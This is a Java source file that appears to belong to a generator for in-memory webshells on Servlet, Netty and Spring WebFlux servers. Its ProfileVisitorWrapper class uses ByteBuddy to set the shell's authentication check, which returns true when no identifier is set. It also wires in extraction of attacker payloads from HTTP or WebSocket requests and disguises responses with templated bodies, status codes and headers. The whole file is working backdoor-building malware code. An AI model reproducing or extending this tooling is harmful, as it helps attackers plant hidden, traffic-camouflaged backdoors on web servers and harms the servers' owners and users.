package com.reajason.noone.core;

import com.reajason.javaweb.memshell.ShellType;
import com.reajason.noone.core.generator.identifier.NettyHttpIdentifierVisitor;
import com.reajason.noone.core.generator.identifier.ReactorIdentifierVisitor;
import com.reajason.noone.core.generator.identifier.ServletIdentifierVisitor;
import com.reajason.noone.core.generator.protocol.WrapResDataWrapper;
import com.reajason.noone.core.generator.protocol.WrapResWrapper;
import com.reajason.noone.core.generator.protocol.netty.NettyGetPayloadFromContentWrapper;
import com.reajason.noone.core.generator.protocol.reactor.ReactorGetPayloadFromRequestWrapper;
import com.reajason.noone.core.generator.protocol.servlet.ServletGetPayloadFromRequestWrapper;
import com.reajason.noone.core.profile.Profile;
import com.reajason.noone.core.profile.config.*;
import com.reajason.noone.core.transform.TransformWrapper;
import net.bytebuddy.dynamic.DynamicType;
import net.bytebuddy.implementation.FixedValue;

import static net.bytebuddy.matcher.ElementMatchers.*;

public class ProfileVisitorWrapper {
    public static DynamicType.Builder<?> extend(
            DynamicType.Builder<?> builder, Profile profile,
            String shellType, String shellClassName) {

        builder = applyIdentifierConfig(builder, profile.getIdentifier(), shellType);

        ProtocolConfig protocolConfig = profile.getProtocolConfig();
        if (protocolConfig instanceof HttpProtocolConfig httpConfig) {
            builder = applyHttpProtocolConfig(builder, httpConfig, shellClassName, shellType);
        } else if (protocolConfig instanceof WebSocketProtocolConfig wsConfig) {
            builder = applyWsProtocolConfig(builder, wsConfig, shellClassName);
        }

        builder = TransformWrapper.extend(builder, profile);
        return builder;
    }


    private static DynamicType.Builder<?> applyIdentifierConfig(
            DynamicType.Builder<?> builder, IdentifierConfig identifier,
            String shellType) {
        if (identifier != null) {
            var implementation = isReactorShell(shellType)
                    ? new ReactorIdentifierVisitor(identifier)
                    : isNettyHttpShell(shellType)
                    ? new NettyHttpIdentifierVisitor(identifier)
                    : new ServletIdentifierVisitor(identifier);
            return builder
                    .method(named("isAuthed")
                            .and(takesArguments(1))
                            .and(returns(boolean.class)))
                    .intercept(implementation);
        }

        return builder.method(named("isAuthed")).intercept(FixedValue.value(true));
    }

    private static DynamicType.Builder<?> applyHttpProtocolConfig(
            DynamicType.Builder<?> builder,
            HttpProtocolConfig httpConfig,
            String shellClassName,
            String shellType
    ) {
        HttpRequestBodyType requestBodyType = httpConfig.getRequestBodyType();
        String requestTemplate = httpConfig.getRequestTemplate();

        if (isNettyHttpShell(shellType)) {
            builder = NettyGetPayloadFromContentWrapper.extend(builder, requestBodyType, requestTemplate);
        } else if (isReactorShell(shellType)) {
            builder = ReactorGetPayloadFromRequestWrapper.extend(builder, requestBodyType, requestTemplate);
        } else {
            builder = ServletGetPayloadFromRequestWrapper.extend(builder, requestBodyType, requestTemplate);
        }

        builder = WrapResDataWrapper.extend(builder, shellClassName,
                httpConfig.getResponseBodyType(), httpConfig.getResponseTemplate());

        builder = WrapResWrapper.extend(builder, shellType,
                httpConfig.getResponseStatusCode(), httpConfig.getResponseHeaders());

        return builder;
    }

    private static DynamicType.Builder<?> applyWsProtocolConfig(
            DynamicType.Builder<?> builder,
            WebSocketProtocolConfig wsProtocolConfig,
            String shellClassName
    ) {
        String messageTemplate = wsProtocolConfig.getMessageTemplate();
        String responseTemplate = wsProtocolConfig.getResponseTemplate();
        builder = NettyGetPayloadFromContentWrapper.extend(builder, HttpRequestBodyType.BINARY, messageTemplate);
        builder = WrapResDataWrapper.extend(builder, shellClassName, HttpResponseBodyType.BINARY, responseTemplate);
        return builder;
    }

    private static boolean isReactorShell(String shellType) {
        return ShellType.SPRING_WEBFLUX_WEB_FILTER.equals(shellType);
    }

    private static boolean isNettyHttpShell(String shellType) {
        return ShellType.NETTY_HANDLER.equals(shellType);
    }
}
